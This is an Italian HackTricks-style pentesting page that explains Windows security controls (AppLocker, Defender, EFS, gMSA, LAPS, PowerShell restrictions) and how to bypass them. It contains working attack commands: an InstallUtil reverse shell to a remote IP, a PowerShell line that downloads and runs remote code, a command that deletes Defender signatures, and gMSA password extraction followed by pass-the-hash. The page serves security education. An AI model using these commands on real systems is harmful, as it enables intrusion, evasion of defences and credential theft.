# Controlli di sicurezza di Windows

{{#include ../../banners/hacktricks-training.md}}

## Criteri di AppLocker

Una whitelist delle applicazioni è un elenco di applicazioni software o eseguibili approvati che possono essere presenti ed essere eseguiti su un sistema. L'obiettivo è proteggere l'ambiente da malware dannosi e software non approvati che non soddisfano le specifiche esigenze aziendali di un'organizzazione.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) è la **soluzione di Microsoft per la whitelist delle applicazioni** e consente agli amministratori di sistema di controllare **quali applicazioni e file possono essere eseguiti dagli utenti**. Offre un **controllo granulare** su eseguibili, script, file di Windows Installer, DLL, app in pacchetto e programmi di installazione di app in pacchetto.\
È comune che le organizzazioni **blocchino cmd.exe e PowerShell.exe** e l'accesso in scrittura a determinate directory, **ma tutto questo può essere aggirato**.

### Verifica

Verifica quali file/estensioni sono nella blacklist/whitelist:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Questo percorso del registro contiene le configurazioni e i criteri applicati da AppLocker e permette di esaminare l'insieme attuale di regole applicate al sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Cartelle scrivibili** utili per aggirare i criteri di AppLocker: se AppLocker consente di eseguire qualsiasi elemento all'interno di `C:\Windows\System32` o `C:\Windows`, puoi usare alcune **cartelle scrivibili** per **aggirare questa restrizione**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- I binari [**"LOLBAS's"**](https://lolbas-project.github.io/) comunemente **considerati attendibili** possono essere utili anche per aggirare AppLocker.
- **Le regole scritte male possono essere aggirate**
  - Per esempio, con **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** puoi creare una **cartella chiamata `allowed`** ovunque e verrà consentita.
  - Spesso le organizzazioni si concentrano anche sul **blocco dell'eseguibile `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ma dimenticano le **altre** [**posizioni dell'eseguibile di PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), come `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- **L'applicazione delle regole alle DLL è molto raramente abilitata**, a causa del carico aggiuntivo che può comportare per un sistema e dei test necessari per assicurarsi che nulla si rompa. Pertanto, usare **DLL come backdoor aiuta ad aggirare AppLocker**.
- Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire** codice **PowerShell** in qualsiasi processo e aggirare AppLocker. Per maggiori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Archiviazione delle credenziali

### Security Accounts Manager (SAM)

Le credenziali locali sono presenti in questo file; le password sono sottoposte ad hashing.

### Local Security Authority (LSA) - LSASS

Le **credenziali** (sottoposte ad hashing) vengono **salvate** nella **memoria** di questo sottosistema per consentire il Single Sign-On.\
**LSA** amministra i criteri di **sicurezza** locali (criteri delle password, autorizzazioni degli utenti...), l'**autenticazione**, i **token di accesso**...\
LSA è il componente che **verifica** le credenziali fornite nel file **SAM** (per un accesso locale) e **comunica** con il **controller di dominio** per autenticare un utente di dominio.

Le **credenziali** vengono **salvate** all'interno del **processo LSASS**: ticket Kerberos, hash NT e LM, password facilmente decrittabili.

### Segreti LSA

LSA può salvare alcune credenziali su disco:

- Password dell'account computer di Active Directory (controller di dominio non raggiungibile).
- Password degli account dei servizi Windows
- Password delle attività pianificate
- Altro (password delle applicazioni IIS...)

### NTDS.dit

È il database di Active Directory. È presente solo nei controller di dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) è un antivirus disponibile in Windows 10 e Windows 11, nonché in alcune versioni di Windows Server. **Blocca** i comuni strumenti di pentesting, come **`WinPEAS`**. Tuttavia, esistono modi per **aggirare queste protezioni**.

### Verifica

Per verificare lo **stato** di **Defender** puoi eseguire il cmdlet PS **`Get-MpComputerStatus`** (controlla il valore di **`RealTimeProtectionEnabled`** per sapere se è attivo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Per enumerarlo puoi anche eseguire:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypting File System (EFS)

EFS protegge i file tramite crittografia, utilizzando una **chiave simmetrica** chiamata **File Encryption Key (FEK)**. Questa chiave viene crittografata con la **chiave pubblica** dell'utente e archiviata nell'**alternative data stream** $EFS del file crittografato. Quando è necessario decrittografare il file, si usa la **chiave privata** corrispondente del certificato digitale dell'utente per decrittografare la FEK dallo stream $EFS. Puoi trovare maggiori dettagli [qui](https://en.wikipedia.org/wiki/Encrypting_File_System).

Gli scenari di **decrittografia senza intervento dell'utente** includono:

- Quando i file o le cartelle vengono spostati in un file system non EFS, come [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), vengono decrittografati automaticamente.
- I file crittografati inviati in rete tramite il protocollo SMB/CIFS vengono decrittografati prima della trasmissione.

Questo metodo di crittografia consente al proprietario di **accedere in modo trasparente** ai file crittografati. Tuttavia, cambiare semplicemente la password del proprietario e accedere non consentirà di decrittografarli.

**Punti chiave**:

- EFS usa una FEK simmetrica, crittografata con la chiave pubblica dell'utente.
- Per decrittografare la FEK si usa la chiave privata dell'utente.
- La decrittografia automatica avviene in condizioni specifiche, come la copia su FAT32 o la trasmissione in rete.
- Il proprietario può accedere ai file crittografati senza passaggi aggiuntivi.

### Verificare le informazioni EFS

Verifica se un **utente** ha **utilizzato** questo **servizio** controllando se esiste questo percorso:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifica **chi** ha **accesso** al file usando cipher /c \<file>\
Puoi anche usare `cipher /e` e `cipher /d` all'interno di una cartella per **crittografare** e **decrittografare** tutti i file

### Decrittografare file EFS

#### Operare come Authority System

Questo metodo richiede che l'**utente vittima** stia **eseguendo** un **processo** nell'host. In tal caso, usando una sessione `meterpreter` puoi impersonare il token del processo dell'utente (`impersonate_token` da `incognito`). In alternativa, puoi semplicemente eseguire `migrate` verso il processo dell'utente.

#### Conoscere la password dell'utente

Mimikatz documenta come importare il certificato e la chiave privata dell'utente e decrittografare i file protetti da EFS quando si conosce la password.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft ha sviluppato **Group Managed Service Accounts (gMSA)** per semplificare la gestione degli account di servizio nelle infrastrutture IT. A differenza dei tradizionali account di servizio, spesso configurati con l'opzione "**Password never expire**", i gMSA offrono una soluzione più sicura e gestibile:

- **Gestione automatica delle password**: i gMSA usano una password complessa di 240 caratteri, che viene modificata automaticamente in base ai criteri del dominio o del computer. Questo processo è gestito dal Key Distribution Service (KDC) di Microsoft, eliminando la necessità di aggiornare manualmente le password.
- **Sicurezza avanzata**: questi account sono immuni ai blocchi e non possono essere usati per gli accessi interattivi, migliorando la sicurezza.
- **Supporto per più host**: i gMSA possono essere condivisi tra più host, risultando ideali per i servizi eseguiti su più server.
- **Supporto per le attività pianificate**: a differenza degli account di servizio gestiti, i gMSA supportano l'esecuzione di attività pianificate.
- **Gestione semplificata degli SPN**: il sistema aggiorna automaticamente il Service Principal Name (SPN) quando cambiano i dettagli sAMaccount del computer o il nome DNS, semplificando la gestione degli SPN.

Le password dei gMSA sono archiviate nella proprietà LDAP _**msDS-ManagedPassword**_ e vengono reimpostate automaticamente ogni 30 giorni dai Domain Controller (DC). Questa password, un blob di dati crittografato noto come [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), può essere recuperata solo dagli amministratori autorizzati e dai server su cui sono installati i gMSA, garantendo un ambiente sicuro. Per accedere a queste informazioni è necessaria una connessione protetta, come LDAPS, oppure la connessione deve essere autenticata con 'Sealing & Secure'.

![Relaying dell'autenticazione NTLM per recuperare una password gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

Puoi leggere questa password con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Trova maggiori informazioni nella ricerca originale archiviata**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

La stessa ricerca spiega come un **NTLM relay attack** possa ottenere una **password gMSA** quando il principal inoltrato è autorizzato a leggere `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Abusare del chaining degli ACL per leggere la password gestita di una gMSA (GenericAll -> ReadGMSAPassword)

In molti ambienti, utenti con privilegi limitati possono ottenere accesso ai segreti gMSA senza compromettere un DC, abusando di ACL degli oggetti configurati in modo errato:<sup>[[3]](#references)</sup>

- A un gruppo che puoi controllare (ad es. tramite GenericAll/GenericWrite) viene concesso `ReadGMSAPassword` su una gMSA.
- Aggiungendoti a quel gruppo, erediti il diritto di leggere via LDAP il blob `msDS-ManagedPassword` della gMSA e ricavarne credenziali NTLM utilizzabili.

Flusso di lavoro tipico:

1) Individua il percorso con BloodHound e contrassegna i tuoi principal di accesso iniziale come Owned. Cerca relazioni come:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Aggiungiti al gruppo intermedio che controlli (esempio con bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Leggi la password gestita gMSA tramite LDAP e ricava l'hash NTLM. NetExec automatizza l'estrazione di `msDS-ManagedPassword` e la conversione in NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Autenticati come gMSA usando l'hash NTLM (non serve alcun testo in chiaro). Se l'account appartiene a Remote Management Users, WinRM funzionerà direttamente:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Note:
- Le letture LDAP di `msDS-ManagedPassword` richiedono il sealing (ad es., LDAPS/sign+seal). Gli strumenti lo gestiscono automaticamente.
- Ai gMSA vengono spesso concessi diritti locali, come WinRM; verifica l'appartenenza ai gruppi (ad es., Remote Management Users) per pianificare il lateral movement.
- Se ti serve solo il blob per calcolare autonomamente l'NTLM, consulta la struttura MSDS-MANAGEDPASSWORD_BLOB.

Un altro percorso ACL consiste in un'autorizzazione di scrittura sull'oggetto gMSA stesso. `msDS-GroupMSAMembership` è il security descriptor usato per decidere quali principal possono recuperare la password gestita. Il GUID dello schema è `888eedd6-ce04-df40-b462-b8a50e41ba38`. Un'ACE `WriteProperty` esatta su quell'attributo per un gruppo sotto il tuo controllo può essere una possibile via per modificare l'elenco dei soggetti autorizzati alla lettura; è diverso dall'essere già presente nell'elenco. Prima di considerare utilizzabile questo percorso, verifica la DACL completa, le ACE di negazione e quelle ereditate, nonché le autorizzazioni effettive. Anche una nuova appartenenza a un gruppo richiede un token/sessione aggiornato prima di tentare la lettura della password.<sup>[[7]](#references)</sup>



## LAPS

La **Local Administrator Password Solution (LAPS)**, disponibile per il download da [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), consente di gestire le password dell'Administrator locale. Queste password, **randomizzate**, univoche e **modificate regolarmente**, vengono archiviate centralmente in Active Directory. L'accesso a queste password è limitato tramite ACL agli utenti autorizzati. Se vengono concesse autorizzazioni sufficienti, è possibile leggere le password di amministratore locale.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

La [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) di PowerShell **limita molte delle funzionalità** necessarie per usare PowerShell in modo efficace, ad esempio bloccando gli oggetti COM, consentendo solo i tipi .NET approvati, i workflow basati su XAML, le classi PowerShell e altro ancora.

### **Verifica**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Nelle versioni attuali di Windows, quel bypass non funziona più, ma puoi usare [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Per compilarlo potrebbe essere necessario** **_Aggiungere un riferimento_** -> _Sfoglia_ ->_Sfoglia_ -> aggiungere `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **modificare il progetto impostando .Net4.5**.

#### Bypass diretto:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare la modalità vincolata. Per maggiori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Criteri di esecuzione di PS

Per impostazione predefinita, è impostato su **restricted**. Modi principali per bypassare questo criterio:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

È possibile trovare altro [qui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

È l'API che può essere usata per autenticare gli utenti.

SSPI seleziona un protocollo di autenticazione appropriato per due macchine che comunicano, preferendo Kerberos quando disponibile. Questi protocolli sono implementati dai Security Support Provider (SSP), installati come DLL in Windows; entrambi i peer devono supportare il provider negoziato.

### Principali SSP

- **Kerberos**: quello preferito
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: per motivi di compatibilità
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: server Web e LDAP; password sotto forma di hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: viene usato per negoziare il protocollo da utilizzare (Kerberos o NTLM; Kerberos è quello predefinito)
  - %windir%\Windows\System32\lsasrv.dll

#### La negoziazione può offrire diversi metodi oppure uno solo.

## UAC - Controllo dell'account utente

[Controllo dell'account utente (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per le attività con privilegi elevati**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA tramite concatenamento dei diritti a WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Eludere AppLocker e la modalità di linguaggio vincolato di PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 modi per eludere la Execution Policy di PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrittare file EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - attributo ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
